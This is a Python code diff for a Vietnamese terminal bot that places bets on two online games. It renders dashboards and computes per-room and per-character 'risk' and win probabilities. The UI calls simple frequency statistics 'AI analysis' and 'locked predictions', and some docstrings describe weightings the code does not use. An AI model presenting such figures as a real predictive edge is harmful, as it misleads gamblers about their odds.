+    if False and (round_warning or str(ui_state) == "DANGER"):
+        text.append("   │   ", style=TST_COLORS["onyx"])
+        text.append("⚠ BỎ VÁN · NGUY HIỂM", style=f"bold {TST_COLORS['ruby']}")
+    return Panel(Align.center(text), border_style=TST_COLORS["onyx"], box=box.SIMPLE, padding=(0, 1))
+
+
+def build_vth_rooms():
+    """Bảng phòng dạng card — giống Athlete Board CDTD + risk."""
+    try:
+        risk_rows = compute_vth_room_risk()
+        risk_by = {r["id"]: r for r in risk_rows}
+    except Exception:
+        risk_by = {}
+
+    grid = Table.grid(expand=True, padding=(0, 1))
+    grid.add_column(ratio=1)
+    grid.add_column(ratio=1)
+    grid.add_column(ratio=1)
+    grid.add_column(ratio=1)
+    cards = []
+    for r in ROOM_ORDER:
+        players = int(room_state[r].get("players", 0) or 0)
+        bet = float(room_state[r].get("bet", 0) or 0)
+        kills = int(room_stats[r].get("kills", 0) or 0)
+        rr = risk_by.get(r) or {}
+        risk_pct = float(rr.get("risk_pct", 50.0) or 50.0)
+        if risk_pct >= 70:
+            risk_col, risk_tag = TST_COLORS["ruby"], "RỦI RO CAO"
+        elif risk_pct >= 40:
+            risk_col, risk_tag = TST_COLORS["neon_orange"], "RỦI RO TB"
+        else:
+            risk_col, risk_tag = TST_COLORS["emerald"], "RỦI RO THẤP"
+
+        if (predicted_rooms and r in predicted_rooms) or predicted_room == r:
+            accent, tag = TST_COLORS["emerald"], "MỤC TIÊU"
+        else:
+            accent, tag = TST_COLORS["onyx"], "SẴN SÀNG"
+
+        body = Text()
+        body.append(f"{r:02d}  ", style=f"bold {accent}")
+        name = ROOM_NAMES.get(r, f"Phòng {r}")
+        # rút gọn tên nếu dài
+        short = name if len(name) <= 18 else name[:16] + "…"
+        body.append(f"{short}\n", style="bold white")
+        body.append(f"{players} người  ·  {bet:.0f}\n", style=TST_COLORS["muted"])
+        body.append(f"KILL {kills}  ", style=TST_COLORS["muted"])
+        body.append(f"{tag}\n", style=f"bold {accent}")
+        body.append(f"RỦI RO {risk_pct:4.0f}%  ", style=f"bold {risk_col}")
+        body.append(risk_tag, style=risk_col)
+        body.append("\n")
+        filled = max(1, min(16, int(risk_pct / 100 * 16)))
+        body.append("━" * filled, style=risk_col)
+        body.append("─" * (16 - filled), style=TST_COLORS["onyx"])
+        cards.append(Panel(body, border_style=accent, box=box.ROUNDED, padding=(0, 1)))
+
+    for row in range(2):
+        grid.add_row(*cards[row * 4:(row + 1) * 4])
+    return Panel(
+        grid,
+        title=f"[bold {TST_COLORS['sapphire']}]01  BẢNG PHÒNG[/]",
+        subtitle="mục tiêu • rủi ro mỗi ván",
+        border_style=TST_COLORS["sapphire"],
+        box=box.ROUNDED,
+        padding=(0, 1),
+    )
+
+
+def build_vth_mid():
+    """Panel 02 — giống CDTD: thanh tiến trình AI / khóa mục tiêu / kết quả."""
+    state_map = {
+        "IDLE": "CHỜ",
+        "WAITING": "CHỜ",
+        "ANALYZING": "ĐANG PHÂN TÍCH",
+        "PREDICTED": "ĐÃ DỰ ĐOÁN",
+        "RESULT": "KẾT QUẢ",
+        "BETTING": "ĐANG CƯỢC",
+    }
+    st = state_map.get(str(ui_state), str(ui_state))
+    algo_name = SELECTION_MODES.get(settings.get("algo", "RANDOM"), settings.get("algo", "?"))
+    body = Text()
+
+    if str(ui_state) == "SKIP":  # chỉ nghỉ theo setting user, không danger
+        body.append("⚠ CẢNH BÁO NGUY HIỂM" + chr(10) + chr(10), style=f"bold {TST_COLORS['ruby']}")
+        body.append((round_warning or "Phân tích không ổn") + chr(10) + chr(10), style="bold white")
+        body.append("BỎ VÁN NÀY", style=f"bold {TST_COLORS['neon_orange']}")
+        body.append(chr(10) + chr(10) + "Chờ kỳ sau…", style=TST_COLORS["muted"])
+        accent, title = TST_COLORS["ruby"], "02  NGUY HIỂM · BỎ VÁN"
+    elif str(ui_state) == "ANALYZING":
+
+        elapsed = time.time() - (analysis_start_ts or time.time())
+        dur = max(float(analysis_duration or 45.0), 0.1)
+        progress = min(1.0, elapsed / dur)
+        filled = int(30 * progress)
+        body.append("LUỒNG QUYẾT ĐỊNH AI" + chr(10) + chr(10), style=f"bold {TST_COLORS['sapphire']}")
+        body.append("[" + "■" * filled + "·" * (30 - filled) + "]" + chr(10), style=f"bold {TST_COLORS['neon_pink']}")
+        body.append(f"{chr(10)}{progress * 100:05.1f}%  ", style=f"bold {TST_COLORS['gold']}")
+        body.append(f"Còn {max(0, int(dur - elapsed))}s", style=TST_COLORS["muted"])
+        body.append(f"{chr(10)}{chr(10)}{algo_name}", style=TST_COLORS["muted"])
+        accent, title = TST_COLORS["sapphire"], "02  AI PHÂN TÍCH"
+    elif (predicted_rooms or predicted_room is not None) and str(ui_state) in ("PREDICTED", "BETTING", "WAITING", "IDLE"):
+        rooms = predicted_rooms if predicted_rooms else ([predicted_room] if predicted_room is not None else [])
+        names = "  •  ".join(ROOM_NAMES.get(r, f"P{r}") for r in rooms) or "N/A"
+        bet_amt = current_bet or base_bet
+        n = max(1, len(rooms))
+        body.append("DỰ ĐOÁN ĐÃ KHÓA" + chr(10) + chr(10), style=f"bold {TST_COLORS['emerald']}")
+        body.append(names + chr(10) + chr(10), style="bold white")
+        body.append(f"CƯỢC  {float(bet_amt):.2f} × {n}" + chr(10), style=TST_COLORS["muted"])
+        body.append(f"TỔNG  {float(bet_amt) * n:.2f} BUILD" + chr(10), style=f"bold {TST_COLORS['gold']}")
+        try:
+            rm = {int(r["id"]): float(r.get("win_prob", 50)) for r in (compute_vth_room_risk() or [])}
+            ps = [rm.get(int(r), 50.0) for r in rooms]
+            if len(ps) == 1:
+                body.append(chr(10) + f"P(THẮNG) ≈ {ps[0]:.0f}%", style=TST_COLORS["emerald"])
+                body.append(chr(10) + f"P(THUA)   ≈ {100.0-ps[0]:.0f}%", style=TST_COLORS["ruby"])
+            elif ps:
+                p_all = 1.0
+                for p in ps:
+                    p_all *= p / 100.0
+                body.append(chr(10) + f"P(SỐNG CẢ) ≈ {p_all*100:.0f}%", style=TST_COLORS["emerald"])
+                body.append(chr(10) + f"P(DÍNH ≥1) ≈ {(1-p_all)*100:.0f}%", style=TST_COLORS["ruby"])
+        except Exception:
+            pass
+        accent, title = TST_COLORS["emerald"], "02  KHÓA MỤC TIÊU"
+    elif str(ui_state) == "RESULT":
+        last = None
+        try:
+            if bet_history:
+                last = bet_history[-1]
+        except Exception:
+            last = None
+        win = bool(last and last.get("result") == "Thắng")
+        accent = TST_COLORS["emerald"] if win else TST_COLORS["ruby"] if last else TST_COLORS["gold"]
+        body.append("KẾT THÚC VÁN" + chr(10) + chr(10), style=f"bold {accent}")
+        fin = last_finished_issue or (last.get("issue") if last else None)
+        if fin is not None:
+            body.append(f"KỲ {fin} vừa xong" + chr(10), style=TST_COLORS["gold"])
+        room_show = killed_room or last_killed_room
+        if room_show:
+            body.append(f"SÁT THỦ  {ROOM_NAMES.get(room_show, room_show)}" + chr(10) + chr(10), style="bold white")
+        elif last_finished_label:
+            body.append(f"SÁT THỦ  {last_finished_label}" + chr(10) + chr(10), style="bold white")
+        body.append("SẴN SÀNG VÁN SAU", style=TST_COLORS["muted"])
+        title = "02  KẾT QUẢ VÁN"
+    else:
+        accent, title = TST_COLORS["gold"], "02  CHỜ ENGINE"
+        body.append("ĐANG CHỜ DỮ LIỆU THOÁT HIỂM" + chr(10) + chr(10), style=f"bold {accent}")
+        body.append(str(_ws_status or "Kết nối...") + chr(10), style=TST_COLORS["muted"])
+        if not USER_ID or not SECRET_KEY:
+            body.append(chr(10) + "⚠ Chưa chọn tài khoản game", style=TST_COLORS["ruby"])
+        elif issue_id:
+            body.append(chr(10) + f"Kỳ: {issue_id}", style=TST_COLORS["sky"])
+
+    return Panel(
+        Align.center(body, vertical="middle"),
+        title=f"[bold]{title}[/]",
+        border_style=accent,
+        box=box.ROUNDED,
+        padding=(1, 2),
+    )
+
+
+
+
+def build_vth_history():
+    t = Table(show_header=True, box=box.SIMPLE_HEAVY, expand=True, padding=(0, 1))
+    t.add_column("KỲ", style=TST_COLORS["muted"], no_wrap=True)
+    t.add_column("PHÒNG")
+    t.add_column("CƯỢC", justify="right", style=TST_COLORS["gold"])
+    t.add_column("KẾT QUẢ", justify="right")
+    rows = list(bet_history)[-6:]
+    if not rows:
+        t.add_row("—", "Chưa có", "0.00", Text("CHỜ", style=TST_COLORS["muted"]))
+    for b in rows:
+        res = str(b.get("result", "Đang") or "Đang")
+        if res.lower() in ("đang", "dang", "pending", "wait", "chờ", "cho"):
+            res_show, rc = "CHỜ", TST_COLORS["gold"]
+        elif res == "Thắng":
+            res_show, rc = "THẮNG", TST_COLORS["emerald"]
+        elif res == "Thua":
+            res_show, rc = "THUA", TST_COLORS["ruby"]
+        else:
+            res_show, rc = res.upper(), TST_COLORS["gold"]
+        room_id = b.get("room")
+        room_label = ROOM_NAMES.get(room_id, str(room_id))
+        t.add_row(
+            str(b.get("issue", "-")),
+            str(room_label),
+            f"{float(b.get('amount', 0) or 0):.2f}",
+            Text(res_show, style=f"bold {rc}"),
+        )
+    return Panel(t, title="[bold]03  SỔ CƯỢC[/]", border_style=TST_COLORS["onyx"], box=box.ROUNDED, padding=(0, 1))
+
+
+def build_vth_stats():
+    """Ma trận phòng + session — giống PERFORMANCE MATRIX CDTD."""
+    try:
+        risk_rows = compute_vth_room_risk()
+    except Exception:
+        risk_rows = []
+    risk_by = {r["id"]: r for r in risk_rows}
+
+    t = Table(show_header=True, box=box.SIMPLE, expand=True, padding=(0, 1))
+    t.add_column("STT", width=3, style=TST_COLORS["muted"])
+    t.add_column("PHÒNG")
+    t.add_column("NGƯỜI", justify="right")
+    t.add_column("CƯỢC", justify="right", style=TST_COLORS["gold"])
+    t.add_column("KILL", justify="right")
+    t.add_column("P(THẮNG)", justify="right")
+    t.add_column("P(THUA)", justify="right")
+    t.add_column("MỨC", justify="center")
+    for r in ROOM_ORDER:
+        rr = risk_by.get(r) or {}
+        risk_pct = float(rr.get("risk_pct", 50.0) or 50.0)
+        win_p = float(rr.get("win_prob", 100.0 - risk_pct) or (100.0 - risk_pct))
+        lose_p = float(rr.get("lose_prob", 100.0 - win_p) or (100.0 - win_p))
+        lvl, col = _risk_level(risk_pct)
+        wcol = TST_COLORS["emerald"] if win_p >= 55 else TST_COLORS["neon_orange"] if win_p >= 40 else TST_COLORS["ruby"]
+        lcol = TST_COLORS["ruby"] if lose_p >= 55 else TST_COLORS["neon_orange"] if lose_p >= 40 else TST_COLORS["emerald"]
+        t.add_row(
+            str(r),
+            ROOM_NAMES.get(r, str(r)),
+            str(room_state[r].get("players", 0)),
+            f"{float(room_state[r].get('bet', 0) or 0):.0f}",
+            str(room_stats[r].get("kills", 0)),
+            Text(f"{win_p:.0f}%", style=f"bold {wcol}"),
+            Text(f"{lose_p:.0f}%", style=f"bold {lcol}"),
+            Text(lvl, style=f"bold {col}"),
+        )
+
+    pnl = cumulative_profit if cumulative_profit is not None else 0.0
+    wins = sum(1 for b in bet_history if b.get("result") == "Thắng")
+    losses = sum(1 for b in bet_history if b.get("result") == "Thua")
+    summary = Text()
+    summary.append("PHIÊN\n", style=f"bold {TST_COLORS['emerald']}")
+    summary.append(f"VÁN      {wins + losses}\n")
+    summary.append(f"THẮNG    {wins}\n", style=TST_COLORS["emerald"])
+    summary.append(f"THUA     {losses}\n", style=TST_COLORS["ruby"])
+    summary.append(f"MAX T    {max_win_streak}\n")
+    summary.append(f"MAX B    {max_lose_streak}\n")
+    summary.append(
+        f"P&L      {pnl:+.4f} BUILD\n",
+        style=f"bold {TST_COLORS['emerald'] if pnl >= 0 else TST_COLORS['ruby']}",
+    )
+    if risk_rows:
+        safest = min(risk_rows, key=lambda x: x["risk_pct"])
+        riskiest = max(risk_rows, key=lambda x: x["risk_pct"])
+        best_win = max(risk_rows, key=lambda x: float(x.get("win_prob", 0) or 0))
+        summary.append(chr(10) + "XÁC SUẤT THẮNG / THUA" + chr(10), style=f"bold {TST_COLORS['gold']}")
+        summary.append(
+            f"CAO NHẤT {best_win.get('name', '?')}  P≈{float(best_win.get('win_prob', 0)):.0f}%" + chr(10),
+            style=TST_COLORS["emerald"],
+        )
+        summary.append(
+            f"AN TOÀN  {safest.get('name', '?')}  risk {safest['risk_pct']:.0f}%" + chr(10),
+            style=TST_COLORS["emerald"],
+        )
+        summary.append(
+            f"NGUY HIỂM {riskiest.get('name', '?')}  risk {riskiest['risk_pct']:.0f}%" + chr(10),
+            style=TST_COLORS["ruby"],
+        )
+        try:
+            sel = predicted_rooms if predicted_rooms else ([predicted_room] if predicted_room else [])
+            if sel:
+                ps = [float((risk_by.get(rid) or {}).get("win_prob", 50)) for rid in sel]
+                if len(ps) == 1:
+                    summary.append(f"MỤC TIÊU P≈{ps[0]:.0f}%", style=TST_COLORS["sapphire"])
+                else:
+                    p_all = 1.0
+                    for p in ps:
+                        p_all *= p / 100.0
+                    summary.append(f"MULTI P(sống)≈{p_all*100:.0f}%", style=TST_COLORS["sapphire"])
+        except Exception:
+            pass
+
+    return Panel(
+        Columns(
+            [
+                Panel(t, border_style=TST_COLORS["onyx"], box=box.SIMPLE),
+                Panel(summary, border_style=TST_COLORS["gold"], box=box.SIMPLE, padding=(1, 2)),
+            ],
+            equal=True,
+            expand=True,
+        ),
+        title="[bold]04  XÁC SUẤT THẮNG · THUA[/]",
+        border_style=TST_COLORS["sky"],
+        box=box.ROUNDED,
+        padding=(0, 1),
+    )
+
+
+def vth_generate_layout():
+    """VTH NOVA — bố cục 4 tầng giống CDTD (Rich Live)."""
+    root = Table.grid(expand=True, pad_edge=False)
+    root.add_row(build_vth_header())
+    root.add_row(build_vth_marquee())
+
+    middle = Table.grid(expand=True, pad_edge=False)
+    middle.add_column(ratio=60)
+    middle.add_column(ratio=40)
+    middle.add_row(build_vth_rooms(), build_vth_mid())
+    root.add_row(middle)
+
+    root.add_row(build_vth_history())
+    root.add_row(build_vth_stats())
+    return root
+
+
+
+
+def start_game_flow():
+    """Khởi động WebSocket + monitor + UI live Vua Thoát Hiểm."""
+    global stop_flag, current_bet, starting_balance, cumulative_profit
+    global issue_id, killed_room, predicted_room, prediction_locked, ui_state
+    global last_msg_ts, _ws_status, analysis_start_ts, round_index
+    global win_streak, lose_streak, max_win_streak, max_lose_streak
+    stop_flag = False
+    current_bet = base_bet
+    starting_balance = None
+    cumulative_profit = None
+    # reset session state
+    issue_id = None
+    killed_room = None
+    predicted_room = None
+    prediction_locked = False
+    ui_state = "WAITING"
+    analysis_start_ts = None
+    last_msg_ts = time.time()
+    _ws_status = "⏳ Đang kết nối..."
+    win_streak = 0
+    lose_streak = 0
+    for r in ROOM_ORDER:
+        room_state[r] = {"players": 0, "bet": 0}
+    if not USER_ID or not SECRET_KEY:
+        console.print("[bold red]⚠ Chưa chọn tài khoản game (USER_ID / SECRET_KEY). Vào menu Thêm/Chọn tài khoản trước.[/]")
+        Prompt.ask("Nhấn Enter để quay lại", default="")
+        return
+
+    console.clear()
+    brand = Text()
+    brand.append(" ♛ ", style=f"bold {TST_COLORS['bg_deep']} on {TST_COLORS['emerald']}")
+    brand.append("  VUA THOÁT HIỂM  ", style=f"bold {TST_COLORS['platinum']}")
+    brand.append("·  KHỞI ĐỘNG", style=TST_COLORS["muted"])
+    console.print(Panel(Align.center(brand), border_style=TST_COLORS["emerald"], box=box.HEAVY_HEAD, padding=(0, 1)))
+    console.print(Align.center(Text(
+        f"AI: {SELECTION_MODES.get(settings.get('algo'), settings.get('algo'))}  ·  Cược: {base_bet}  ·  x{multiplier}",
+        style=TST_COLORS["muted"]
+    )))
+    console.print()
+
+    # Fetch balance lần đầu
+    try:
+        fetch_balances_3games(retries=2, timeout=8)
+    except Exception:
+        pass
+
+    ws_thread = threading.Thread(target=start_ws, daemon=True)
+    ws_thread.start()
+    mon_thread = threading.Thread(target=monitor_loop, daemon=True)
+    mon_thread.start()
+
+    try:
+        with Live(vth_generate_layout(), refresh_per_second=3, console=console, screen=True) as live:
+            while not stop_flag:
+                live.update(vth_generate_layout())
+                time.sleep(0.5)
+    except KeyboardInterrupt:
+        stop_flag = True
+    finally:
+        stop_flag = True
+        try:
+            wsobj = _ws.get("ws")
+            if wsobj:
+                wsobj.close()
+        except Exception:
+            pass
+
+    console.clear()
+    final_pnl = cumulative_profit or 0
+    pnl_col = TST_COLORS["emerald"] if final_pnl >= 0 else TST_COLORS["ruby"]
+    end_grid = Table.grid(expand=True, padding=(0, 2))
+    end_grid.add_column(ratio=1); end_grid.add_column(ratio=1); end_grid.add_column(ratio=1); end_grid.add_column(ratio=1)
+    end_grid.add_row(
+        Panel(Text.assemble(("MAX W\n", TST_COLORS["muted"]), (str(max_win_streak),  f"bold {TST_COLORS['emerald']}")), border_style=TST_COLORS["emerald"], box=box.SIMPLE, padding=(0,1)),
+        Panel(Text.assemble(("MAX L\n", TST_COLORS["muted"]), (str(max_lose_streak), f"bold {TST_COLORS['ruby']}")),    border_style=TST_COLORS["ruby"],    box=box.SIMPLE, padding=(0,1)),
+        Panel(Text.assemble(("W/L\n",   TST_COLORS["muted"]), (f"{win_streak}/{lose_streak}", f"bold {TST_COLORS['gold']}")), border_style=TST_COLORS["gold"], box=box.SIMPLE, padding=(0,1)),
+        Panel(Text.assemble(("P&L\n",   TST_COLORS["muted"]), (f"{final_pnl:+.4f}", f"bold {pnl_col}")), border_style=pnl_col, box=box.SIMPLE, padding=(0,1)),
+    )
+    console.print(Panel(
+        Group(
+            Align.center(Text("♛  KẾT THÚC PHIÊN  ♛", style=f"bold {TST_COLORS['gold']}")),
+            Rule(style=TST_COLORS["accent_line"]),
+            end_grid,
+        ),
+        border_style=TST_COLORS["gold"],
+        box=box.HEAVY_HEAD,
+        padding=(0, 1),
+    ))
+    console.print("\n[dim]Nhấn Enter để quay lại menu...[/]")
+    input()
+
+
+
+# ================== PHÂN TÍCH RỦI RO VTH / CDTD ==================
+
+def _risk_bar(pct: float, width: int = 12) -> str:
+    pct = max(0.0, min(100.0, float(pct)))
+    filled = int(round(pct / 100.0 * width))
+    return "█" * filled + "░" * (width - filled)
+
+
+def _risk_level(pct: float) -> tuple:
+    if pct >= 70:
+        return "CAO", TST_COLORS["ruby"]
+    if pct >= 40:
+        return "TB", TST_COLORS["neon_orange"]
+    return "THẤP", TST_COLORS["emerald"]
+
+
+def compute_vth_room_risk() -> List[Dict[str, Any]]:
+    """
+    Rủi ro / P(thắng-thua) VTH — P theo tỷ lệ thật (kills/survives hoặc kill log).
+
+    Thành phần (trọng số):
+      • kill_rate Laplace     28%  — tần suất bị kill lịch sử (làm mượt khi ít mẫu)
+      • ewma_recent_kill      22%  — kill gần đây (log 12 ván, trọng số giảm dần)
+      • markov_next           18%  — P(phòng này bị kill sau phòng vừa chết)
+      • crowd + money         20%  — đông người / nhiều tiền (sát thủ hay nhắm)
+      • gap_inverse           12%  — càng lâu chưa kill càng… (mean-revert nhẹ)
+
+    Sau đó chuẩn hóa relative trong 8 phòng (55% tuyệt đối + 45% xếp hạng).
+    """
+    rows = []
+    n_rooms = max(1, len(ROOM_ORDER))
+    max_players = max((int(room_state[r].get("players", 0) or 0) for r in ROOM_ORDER), default=0) or 1
+    max_bet = max((float(room_state[r].get("bet", 0) or 0) for r in ROOM_ORDER), default=0.0) or 1.0
+    log = list(game_kill_log) if game_kill_log else []
+
+    # EWMA kill density trên cửa sổ gần
+    ewma = {r: 0.0 for r in ROOM_ORDER}
+    if log:
+        window = log[-12:]
+        decay = 0.82
+        w = 1.0
+        wsum = 0.0
+        for k in reversed(window):
+            if k in ewma:
+                ewma[k] += w
+            wsum += w
+            w *= decay
+        if wsum > 0:
+            for r in ewma:
+                ewma[r] /= wsum
+
+    # Markov bậc 1: P(next=r | last)
+    markov = {r: 1.0 / n_rooms for r in ROOM_ORDER}
+    if len(log) >= 2:
+        last = log[-1]
+        cnt = defaultdict(float)
+        tot = 0.0
+        for a, b in zip(log, log[1:]):
+            if a == last:
+                cnt[b] += 1.0
+                tot += 1.0
+        alpha = 0.6  # Laplace
+        for r in ROOM_ORDER:
+            markov[r] = (cnt.get(r, 0.0) + alpha) / (tot + alpha * n_rooms)
+
+    for r in ROOM_ORDER:
+        kills = int(room_stats[r].get("kills", 0) or 0)
+        survives = int(room_stats[r].get("survives", 0) or 0)
+        samples = kills + survives
+        # Laplace: giả định đều khi chưa có data
+        kill_rate = (kills + 1.0) / (samples + n_rooms)
+
+        players = int(room_state[r].get("players", 0) or 0)
+        bet = float(room_state[r].get("bet", 0) or 0)
+        crowd = players / max_players
+        money = bet / max_bet
+
+        # gap: số ván từ lần kill gần nhất
+        gap = float(n_rooms + 2)
+        if log:
+            for i in range(len(log) - 1, -1, -1):
+                if log[i] == r:
+                    gap = float(len(log) - 1 - i)
+                    break
+        # lâu chưa kill → mean-revert (hơi tăng risk)
+        gap_inv = min(1.0, gap / 10.0)
+
+        risk = (
+            28.0 * kill_rate
+            + 22.0 * ewma.get(r, 0.0)
+            + 18.0 * markov.get(r, 1.0 / n_rooms)
+            + 12.0 * crowd
+            + 8.0 * money
+            + 12.0 * gap_inv
+        )
+        # scale về ~0-100 (các thành phần ~0-1, tổng trọng 100)
+        risk_pct = max(0.0, min(100.0, risk))
+        rows.append({
+            "id": r,
+            "name": ROOM_NAMES.get(r, f"Phòng {r}"),
+            "kills": kills,
+            "survives": survives,
+            "samples": samples,
+            "kill_rate": kill_rate,
+            "players": players,
+            "bet": bet,
+            "risk_pct": risk_pct,
+            "ewma": ewma.get(r, 0.0),
+            "markov": markov.get(r, 0.0),
+            "gap": gap,
+            "last_kill_round": room_stats[r].get("last_kill_round"),
+        })
+
+    if rows:
+        mx = max(x["risk_pct"] for x in rows) or 1.0
+        mn = min(x["risk_pct"] for x in rows)
+        span = max(1e-6, mx - mn)
+        for x in rows:
+            rel = (x["risk_pct"] - mn) / span * 100.0
+            x["risk_pct"] = 0.55 * x["risk_pct"] + 0.45 * rel
+            x["risk_pct"] = max(0.0, min(100.0, x["risk_pct"]))
+    # === TỶ LỆ THẬT (empirical) ===
+    # P(thua) = số lần phòng bị kill / tổng mẫu quan sát
+    # P(thắng) = 1 - P(thua)  (cược phòng sống sót)
+    n_log = len(log)
+    for x in rows:
+        r = int(x["id"])
+        kills = int(x.get("kills", 0) or 0)
+        survives = int(x.get("survives", 0) or 0)
+        samples = kills + survives
+        k_log = log.count(r) if log else 0
+        if samples > 0:
+            p_lose = kills / float(samples)
+        elif n_log > 0:
+            p_lose = k_log / float(n_log)
+        else:
+            p_lose = 1.0 / max(1, n_rooms)
+        p_lose = max(0.0, min(1.0, p_lose))
+        p_win = 1.0 - p_lose
+        x["win_prob"] = p_win * 100.0
+        x["lose_prob"] = p_lose * 100.0
+        # risk hiển thị = tỷ lệ thua thật
+        x["risk_pct"] = p_lose * 100.0
+        x["empirical"] = True
+        x["samples_used"] = samples if samples > 0 else n_log
+    if rows:
+        s = sum(float(x["win_prob"]) for x in rows) or 1.0
+        for x in rows:
+            x["win_prob_rel"] = float(x["win_prob"]) / s * 100.0
+    rows.sort(key=lambda x: x["lose_prob"], reverse=True)
+    return rows
+
+
+def compute_cdtd_nv_risk(data_top10=None, data_top100=None) -> List[Dict[str, Any]]:
+    """
+    Rủi ro / P(thắng-thua) CDTD — P theo tỷ lệ thật top100 + top10.
+
+      risk ≈ (1 - P_win_ước_lượng) * 100
+
+    P_win gồm:
+      • rate100 (Laplace)     40%  — form dài hạn top100
+      • ewma form 10 kỳ       35%  — form gần (trọng số giảm dần)
+      • markov P(next|last)   15%  — chuỗi chuyển NV
+      • cold-boost            10%  — NV quá lạnh hơi tăng cơ hội (giảm risk nhẹ)
+    """
+    if data_top10 is None:
+        data_top10 = top_10_cdtd()
+    if data_top100 is None:
+        data_top100 = top_100_cdtd()
+
+    win100 = [0] * 6
+    if data_top100 and len(data_top100) > 1 and data_top100[1]:
+        try:
+            win100 = [int(x or 0) for x in data_top100[1][:6]]
+            while len(win100) < 6:
+                win100.append(0)
+        except Exception:
+            win100 = [0] * 6
+    total100 = sum(win100) or 1
+    # Laplace dài hạn
+    rate100 = [(w + 0.8) / (total100 + 0.8 * 6) for w in win100]
+
+    recent = []
+    if data_top10 and len(data_top10) > 1 and data_top10[1]:
+        try:
+            recent = [int(x) for x in data_top10[1] if x is not None]
+        except Exception:
+            recent = list(data_top10[1])
+
+    # EWMA form
+    ewma = {i: 0.0 for i in range(1, 7)}
+    if recent:
+        decay = 0.78
+        w = 1.0
+        wsum = 0.0
+        for nv in reversed(recent[-12:]):
+            try:
+                nv = int(nv)
+            except Exception:
+                continue
+            if nv in ewma:
+                ewma[nv] += w
+            wsum += w
+            w *= decay
+        if wsum > 0:
+            for i in ewma:
+                ewma[i] /= wsum
+
+    # Markov next
+    markov = {i: 1.0 / 6 for i in range(1, 7)}
+    if len(recent) >= 2:
+        last = recent[-1]
+        cnt = defaultdict(float)
+        tot = 0.0
+        for a, b in zip(recent, recent[1:]):
+            if a == last:
+                cnt[b] += 1.0
+                tot += 1.0
+        alpha = 0.5
+        for i in range(1, 7):
+            markov[i] = (cnt.get(i, 0.0) + alpha) / (tot + alpha * 6)
+
+    last_winner = recent[-1] if recent else None
+    n_recent = len(recent)
+    rows = []
+    for i in range(1, 7):
+        w100 = win100[i - 1]
+        # TỶ LỆ THẬT top100 (không Laplace, không Markov)
+        p100 = (w100 / float(total100)) if total100 > 0 else (1.0 / 6)
+        wins10 = sum(1 for x in recent if x == i)
+        p10 = (wins10 / float(n_recent)) if n_recent > 0 else p100
+        # Trọng số theo số mẫu: có top10 thì trộn 55/45, không thì chỉ top100
+        if n_recent >= 5:
+            p_win = 0.55 * p100 + 0.45 * p10
+        elif n_recent > 0:
+            p_win = 0.70 * p100 + 0.30 * p10
+        else:
+            p_win = p100
+        p_win = max(0.0, min(1.0, p_win))
+        p_lose = 1.0 - p_win
+        rows.append({
+            "id": i,
+            "name": NV.get(i, f"NV{i}"),
+            "icon": NV_ICONS.get(i, "◆"),
+            "wins_100": w100,
+            "rate_100": p100,
+            "wins_10": wins10,
+            "rate_10": p10,
+            "form10": p10,
+            "p_win": p_win,
+            "win_prob": p_win * 100.0,
+            "lose_prob": p_lose * 100.0,
+            "risk_pct": p_lose * 100.0,  # risk = tỷ lệ thua thật
+            "empirical": True,
+            "last_winner": last_winner == i,
+        })
+    if rows:
+        s = sum(float(x["win_prob"]) for x in rows) or 1.0
+        for x in rows:
+            x["win_prob_rel"] = float(x["win_prob"]) / s * 100.0
+    rows.sort(key=lambda x: x["lose_prob"], reverse=True)
+    return rows
+
+
+def display_vth_risk_table(rows: List[Dict[str, Any]]) -> None:
+    t = Table(
+        title=f"[bold {TST_COLORS['emerald']}]♛ RỦI RO PHÒNG — VUA THOÁT HIỂM[/]",
+        box=box.SIMPLE_HEAVY,
+        expand=True,
+        padding=(0, 1),
+    )
+    t.add_column("#", width=3, style=TST_COLORS["muted"])
+    t.add_column("PHÒNG", style=f"bold {TST_COLORS['platinum']}")
+    t.add_column("KILL", justify="right")
+    t.add_column("SỐNG", justify="right")
+    t.add_column("PLAYERS", justify="right")
+    t.add_column("BET", justify="right")
+    t.add_column("RỦI RO", justify="left")
+    t.add_column("MỨC", justify="center")
+    for i, r in enumerate(rows, 1):
+        lvl, col = _risk_level(r["risk_pct"])
+        bar = _risk_bar(r["risk_pct"])
+        t.add_row(
+            str(i),
+            r["name"],
+            str(r["kills"]),
+            str(r["survives"]),
+            str(r["players"]),
+            f"{r['bet']:.0f}",
+            Text(f"{bar} {r['risk_pct']:.0f}%", style=col),
+            Text(lvl, style=f"bold {col}"),
+        )
+    console.print(t)
+    if rows:
+        safest = min(rows, key=lambda x: x["risk_pct"])
+        riskiest = max(rows, key=lambda x: x["risk_pct"])
+        tip = Text()
+        tip.append("AN TOÀN NHẤT  ", style=TST_COLORS["muted"])
+        tip.append(f"{safest['name']} ({safest['risk_pct']:.0f}%)", style=f"bold {TST_COLORS['emerald']}")
+        tip.append("    │    ", style=TST_COLORS["accent_line"])
+        tip.append("NGUY HIỂM NHẤT  ", style=TST_COLORS["muted"])
+        tip.append(f"{riskiest['name']} ({riskiest['risk_pct']:.0f}%)", style=f"bold {TST_COLORS['ruby']}")
+        console.print(Panel(Align.center(tip), border_style=TST_COLORS["accent_line"], box=box.SIMPLE, padding=(0, 1)))
+        if all(r["samples"] == 0 for r in rows):
+            console.print(Panel(
+                Text(
+                    "⚠ Chưa có lịch sử kill trong session.\n"
+                    "Chạy VTH một lúc rồi mở lại menu này để số liệu chính xác hơn.\n"
+                    "Điểm hiện tại dựa trên players/bet realtime (nếu có).",
+                    style=TST_COLORS["neon_orange"],
+                ),
+                border_style=TST_COLORS["neon_orange"],
+                box=box.ROUNDED,
+                title="[bold]Gợi ý[/]",
+            ))
+
+
+def display_cdtd_risk_table(rows: List[Dict[str, Any]]) -> None:
+    t = Table(
+        title=f"[bold {TST_COLORS['neon_blue']}]▶▶ RỦI RO NHÂN VẬT — CHẠY ĐUA TỐC ĐỘ[/]",
+        box=box.SIMPLE_HEAVY,
+        expand=True,
+        padding=(0, 1),
+    )
+    t.add_column("#", width=3, style=TST_COLORS["muted"])
+    t.add_column("NHÂN VẬT", style=f"bold {TST_COLORS['platinum']}")
+    t.add_column("THẮNG/100", justify="right")
+    t.add_column("%100", justify="right")
+    t.add_column("THẮNG/10", justify="right")
+    t.add_column("%10", justify="right")
+    t.add_column("RỦI RO CƯỢC", justify="left")
+    t.add_column("MỨC", justify="center")
+    for i, r in enumerate(rows, 1):
+        lvl, col = _risk_level(r["risk_pct"])
+        bar = _risk_bar(r["risk_pct"])
+        name = f"{r['icon']} {r['name']}"
+        if r.get("last_winner"):
+            name += " ← vừa thắng"
+        t.add_row(
+            str(i),
+            name,
